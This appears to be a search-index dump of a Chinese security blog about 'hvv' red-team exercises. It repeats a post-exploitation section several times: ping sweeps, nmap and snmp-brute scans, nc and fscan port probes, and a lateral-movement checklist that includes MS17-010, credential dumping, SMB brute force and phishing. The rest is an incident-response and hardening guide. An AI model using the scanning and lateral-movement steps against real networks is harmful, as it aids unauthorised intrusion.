连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#内网主机存活探测"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1icmp"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2nmap"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#内网主机端口探测"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1单个端口探测"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2多个端口探测"},{"categories":["hvv"],"content":"\r横向移动方法： 利用ms17010等系统漏洞 对跳板机密码进行抓取，使用抓取到密码爆破内网其他主机 利用EDR、堡垒机、云管平台、vmware esxi等集权系统漏洞 使用内网邮件服务进行邮件钓鱼 利用IPC$横向移动 smb爆破 对管理端口、数据库进行弱口令爆破 未授权访问漏洞 域渗透相关漏洞 虚拟机逃逸 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#横向移动方法"},{"categories":["hvv"],"content":"HVV专题–应急响应 常见的应急响应事件分类： **Web入侵：**网页挂马、主页篡改、Webshell **系统入侵：**病毒木马、勒索软件、远控后门 **网络攻击：**DDOS攻击、DNS劫持、ARP欺骗 基本思路流程： **收集信息：**收集客户信息和中毒主机信息，包括样本 **判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等 **抑制范围：**隔离使受害⾯不继续扩⼤ **深入分析：**日志分析、进程分析、启动项分析、样本分析方便后期溯源 **清理处置：**杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产 **产出报告：**整理并输出完整的安全事件报告 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#"},{"categories":["hvv"],"content":"\r入侵排查被入侵主机的排查流程： 定位被入侵的主机并且立即对该主机进行断网隔离 确定攻击类型 确定被入侵的时间范围 定位恶意文件和入侵痕迹 溯源入侵来源 清理恶意文件/修复漏洞 事件复盘 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#入侵排查"},{"categories":["hvv"],"content":"\rWindows入侵排查","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows入侵排查"},{"categories":["hvv"],"content":"\r检查系统账号安全查看服务器是否有弱口令，远程管理端口3389，22等端口是否对公网开放 可以问服务器管理人员，或者自行扫描测试 查看服务器是否存在可疑账号 Win+R-\u003elusrmgr.msc 看隐藏账号、克隆账号 创建用户时，在用户名后面加上$，就会创建成隐藏账号。 隐藏用户不能在 net user 和控制面板中看到，需要用其他的方式。 1、lusrmgr.msc 2、注册表HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/ 在cmd中输入：net user 看看有没有陌生用户 在cmd中输入：regedit 找到注册表分支 “HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/”看看有没有克隆用户（可以看到系统中的所有用户，包括隐藏用户） 关于克隆账号，看账号注册表中的F值和其他账号的F值是否相同 使用D盾_web查杀工具，集成了对克隆账号检测的功能 结合日志，查看管理员登录时间、用户名是否存在异常 Win+R-\u003eeventvwr.msc 导出Windows的安全日志，利用LogParser进行分析 同时也要注意查看administrators组中是否存在赋权异常的账号。比如正常情况下guest用户处于禁用状态、普通应用账户(weblogic、apache、mysql)不需要在administrators组中。如下图，执行命令net user guest查看guest账号的信息，如果guest账号被启用，且在管理员组成员中有guest用户，需要询问客户运维人员该guest账户启用的必要性以及加入管理组是否有必要，否则可认为攻击者将系统自带用户guest启用并提权至管理员组后作为后门账号使用。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查系统账号安全"},{"categories":["hvv"],"content":"\r检查系统账号安全查看服务器是否有弱口令，远程管理端口3389，22等端口是否对公网开放 可以问服务器管理人员，或者自行扫描测试 查看服务器是否存在可疑账号 Win+R-\u003elusrmgr.msc 看隐藏账号、克隆账号 创建用户时，在用户名后面加上$，就会创建成隐藏账号。 隐藏用户不能在 net user 和控制面板中看到，需要用其他的方式。 1、lusrmgr.msc 2、注册表HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/ 在cmd中输入：net user 看看有没有陌生用户 在cmd中输入：regedit 找到注册表分支 “HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/”看看有没有克隆用户（可以看到系统中的所有用户，包括隐藏用户） 关于克隆账号，看账号注册表中的F值和其他账号的F值是否相同 使用D盾_web查杀工具，集成了对克隆账号检测的功能 结合日志，查看管理员登录时间、用户名是否存在异常 Win+R-\u003eeventvwr.msc 导出Windows的安全日志，利用LogParser进行分析 同时也要注意查看administrators组中是否存在赋权异常的账号。比如正常情况下guest用户处于禁用状态、普通应用账户(weblogic、apache、mysql)不需要在administrators组中。如下图，执行命令net user guest查看guest账号的信息，如果guest账号被启用，且在管理员组成员中有guest用户，需要询问客户运维人员该guest账户启用的必要性以及加入管理组是否有必要，否则可认为攻击者将系统自带用户guest启用并提权至管理员组后作为后门账号使用。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#看隐藏账号克隆账号"},{"categories":["hvv"],"content":"\r检查异常端口、进程检查端口连接情况，是否有远程连接、可疑连接 netstat -ano tasklist | find \"PID\" 进程 开始--运行--输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。 使用D盾，查看可以进程，查看有没有签名信息，或者可以使用Process Explorer等工具查看 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常端口进程"},{"categories":["hvv"],"content":"\r检查启动项、计划任务、服务检查服务器是否有异常的启动项 火绒等安全软件查看 Win+R-\u003eregedit，打开注册表，查看开机启动项是否正常，特别注意一下三个注册表项 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce 检查计划任务 控制面板-\u003e计划任务 Win+R-\u003ecmd-\u003eschtasks/at 服务自启动 Win+R-\u003eservices.msc 查看组策略 在无法使用工具、只能手工排查的情况下，可查看常见的自启项手否有异常文件。打开gpedit.msc–计算机配置/用户配置–Windows设置–脚本，在此处可设置服务器启动/关机或者用户登录/注销时执行的脚本。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查启动项计划任务服务"},{"categories":["hvv"],"content":"\r检查系统相关信息查看系统版本以及补丁信息 Win+R-\u003ecmd-\u003esysteminfo 查看可以目录及文件 查看用户目录，新建账号会生成一个用户目录 Win+R-\u003ecmd-\u003e%UserProfile%\\Recent：查看最近打开的文件进行分析 文件夹/文件可以根据时间排序，可以看看最近有没有什么可疑的文件夹/文件 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查系统相关信息"},{"categories":["hvv"],"content":"\r自动化查杀病毒查杀 下载安全软件，更新病毒库，进行全盘扫描 Webshell查杀 选择具体站点路径进行webshell查杀，建议最少选择两款查杀工具，可以互相补充规则库的不足 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#自动化查杀"},{"categories":["hvv"],"content":"\r日志分析系统日志 前提：开启审核策略 Win+R-\u003eeventvwr.msc-\u003e导出安全日志-\u003eLogParser进行分析 Web访问日志 找到中间件的web日志，打包到本地进行分析 Linux下可以使用Shell命令组合查询分析 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#日志分析"},{"categories":["hvv"],"content":"\rWindows安全事件ID 系统： 1074，通过这个事件ID查看计算机的开机、关机、重启的时间以及原因和注释。 6005，表示计算机日志服务已启动，如果出现了事件ID为6005，则表示这天正常启动了系统。 104，这个时间ID记录所有审计日志清除事件，当有日志被清除时，出现此事件ID。 安全： 4624，这个事件ID表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。 4625，这个事件ID表示登陆失败的用户。 4720,4722,4723,4724,4725,4726,4738,4740,事件ID表示当用户帐号发生创建，删除，改变密码时的事件记录。 4727,4737,4739,4762,事件ID表示当用户组发生添加、删除时或组内添加成员时生成该事件。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows安全事件id"},{"categories":["hvv"],"content":"\rLinux入侵排查","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#linux入侵排查"},{"categories":["hvv"],"content":"\r账号安全 用户信息文件/etc/passwd 影子文件/etc/shadow 命令： who查看当前登录用户(tty本地登陆pts远程登录) w查看系统信息，想知道某一时刻用户的行为 uptime查看登陆多久、多少用户，负载 入侵排查 查询特权用户：awk -F: ‘$3==0{print $1}’ /etc/passwd 查询可以远程登录的账号：awk ‘/\\$1|\\$6/{print $1}’ /etc/shadow 查询具有sudo权限的账号：more /etc/sudoers | grep -v “^#\\|^$” grep “ALL=(ALL)” 禁用或删除多余及可疑的帐号： usermod -L user 禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 userdel user 删除user用户 userdel -r user 将删除user用户，并且将/home目录下的user目录一并删除 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#账号安全"},{"categories":["hvv"],"content":"\r历史命令 必会命令：history 入侵排查：cat .bash_history »history.txt ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#历史命令"},{"categories":["hvv"],"content":"\r检查异常端口 netstat -antlp|more 查看下pid所对应的进程文件路径， 运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号） ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常端口"},{"categories":["hvv"],"content":"\r检查异常进程 #查看当前开放端口 netstat -tnlp #查看当前系统上运行的所有进程 ps -ef #查看进程 ps aux | grep pid #可以直接看到进程实时情况 top #查看cpu占用率前十的进程，互补top命令 ps aux --sort=pcpu | head -10 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常进程"},{"categories":["hvv"],"content":"\r检查开机启动项当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链 接即可 more /etc/rc.local /etc/rc.d/rc[0-6].d ls -l /etc/rc.d/rc3.d/ ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查开机启动项"},{"categories":["hvv"],"content":"\r检查定时任务检查以下目录下是否有可疑文件 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* /etc/cron.daily/* ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查定时任务"},{"categories":["hvv"],"content":"\r检查服务 chkconfig 修改/etc/re.d/rc.local文件，加入/etc/init.d/httpd start 使用nesysv命令管理自启动 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查服务"},{"categories":["hvv"],"content":"\r检查异常文件 查看敏感目录，如tmp目录下的文件，同时注意隐藏文件夹，以”..”为名的文件夹具有隐藏属性 得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ 可以使用ﬁnd命令来查找，如 ﬁnd /opt -iname \"*\" -atime 1 -type f 找出 /opt 下一天前访问过的文件 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:8","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常文件"},{"categories":["hvv"],"content":"\r检查系统日志\r日志默认存放位置：/var/log 日志分析技巧 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=\u003c\u003e){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown - ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:9","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查系统日志"},{"categories":["hvv"],"content":"\r动态链接库 遇到挖矿病毒，往往用ps，top等命令是看不到异常的，且即使kill掉进程和计划任务项往往过一会进程就会重新起来。这种情况往往是存在预加载恶意动态链接库的后门 使用 readelf -Ws /bin/ls 查看ls命令调用的库函数 警惕利用Linux预加载型恶意动态链接库的后门 应急响应系列之Linux库文件劫持技术分析 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:10","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#动态链接库"},{"categories":["hvv"],"content":"\rWindows加固思路 在 win ser2016 中如何管理重命名 administrator, 禁用 GUEST 系统不显示上次登录的账户名。 清理系统无效账户. 按用户类型分配账号 配置密码策略 账户锁定策略 远端系统强制关机设置,只指派给Administrators组 本地关机设置,只指派给Administrators组 用户权限指派 授权账户本地登录 授权账户从网络访问 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:3:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows加固思路"},{"categories":["hvv"],"content":"\rWindows命令 netstat -ano 查看开放端口 systeminfo 查看系统信息 ipconfig/all 查看网络信息 shell whoami/all 查看所有用户信息 wmic process list brief 查询进程信息 wmic startup get command,caption 查看启动程序信息 shell tasklist 查看常见的杀毒软件进程 hostname 获取dns信息 net view 查看当前局域网中的计算机列表 net user 查看当前计算机中的用户 systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\" 查询操作系统及软件信息 echo %PROCESSOR_ARCHITECTURE% 查看系统体系结构 powershell \"Get-WmiObject -class Win32_Product |Select-Object -Property name, version\" 使用PowerShell收集软件的版本信息 whoami \u0026\u0026 whoami /priv 查看当前权限 wmic service list brief 查询本机服务信息 wmic product get name, version 查看安装的软件的版本、路径等 shell net view /domain 查看主域信息 shell net time /domain 查看时间服务器 shell net config workstation 查看当前的登录域与用户信息 nslookup god.org 寻找域dns服务器ip ","date":"2023-11-17","objectID":"/hvv_emergency_response/:4:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows命令"},{"categories":["hvv"],"content":"\rLinux加固思路 删除无用账号 检查特殊账号 添加口令策略 限制su 进制root直接登录 设置隐藏文件属性(先最小,后加) 关闭不必要服务 更改ssh端口号 防爆破 记录日志 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:5:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#linux加固思路"},{"categories":["hvv"],"content":"\rwebshell 流量信息","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#webshell-流量信息"},{"categories":["hvv"],"content":"\rWebshell流量监测思路**1、特征分析：**分析流量特征中的关键特征，判断是否存在webshell流量特征； **2、请求模式：**分析webshell流量的请求模式，可以通过分析URL，参数和头部信息来判断是否存在webshell流量； **3、检测内容：**通过分析流量中的关键字等特征，判断是否存在webshell流量特征； **4、字符集：**分析流量中的字符集是否webshell流量关联； **5、加密算法：**分析流量中的加密算法，判断是否存在webshell流量特征； **6、文件上传：**分析流量中是否存在文件上传性质等性质，判断是否存在webshell流量特征； **7、恶意脚本：**分析流量中是否存在恶意脚本，判断是否存在webshell流量特征； ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#webshell流量监测思路"},{"categories":["hvv"],"content":"\r菜刀请求体中传递的payload为base64编码 请求体中存在eval，base64等特征字符 传给cmd的这些流量字符中有自己的特征：1、都是系统命令；2、必须以分号结尾；3、数据包源一般是ip 